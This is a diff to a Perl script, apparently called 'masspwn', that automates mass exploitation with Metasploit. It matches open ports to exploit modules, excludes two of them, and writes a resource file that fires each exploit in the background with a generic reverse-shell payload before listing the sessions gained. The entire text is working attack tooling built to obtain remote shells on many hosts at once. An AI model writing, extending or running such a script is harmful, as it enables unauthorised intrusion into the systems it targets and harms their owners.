@@ -44,8 +44,10 @@ foreach(@nport) {
   my @moduledir = `grep RPORT modules/ -R | grep \\($curport\\) | grep exploit`;
   foreach(@moduledir) {
     my $curmod = $_;
-    $curmod =~ m/.*\/(exploit.*)\.rb\:.*/;
-    push(@modules, $1);
+    if(($curmod !~ m/chain_reply/) && ($curmod !~ m/trans2open/)) {
+      $curmod =~ m/.*\/(exploit.*)\.rb\:.*/;
+      push(@modules, $1);
+    }
   }
 }
 my @umods;
@@ -70,10 +72,11 @@ foreach(@umods) {
   print($fh "set ExitOnSession false\n");
   print($fh "set PAYLOAD generic_shell_reverse\n");
   print($fh "exploit -j -z\n");
-  print($fh "exit\n");
+  print($fh "back\n");
   $handler++;
 }
 print($fh "jobs -K\n");
+print($fh "sleep 15\n");
 print($fh "sessions\n");
 system("./msfconsole -r masspwn.$pid.msf");
 unlink("masspwn.$pid.msf");
